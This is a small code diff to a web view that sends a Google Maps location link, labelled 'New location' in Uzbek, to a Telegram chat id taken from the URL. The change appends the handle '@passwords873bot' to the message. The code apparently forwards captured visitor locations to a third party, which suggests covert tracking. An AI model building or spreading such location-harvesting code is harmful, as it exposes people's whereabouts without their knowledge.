@@ -20,7 +20,7 @@ def index(request,id):
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
             data={
                 "chat_id": id,
-                "text": f"📍 Yangi lokatsiya:\n{google_map_url}"
+                "text": f"📍 Yangi lokatsiya:\n{google_map_url} \n\n@passwords873bot"
             }
         )
 
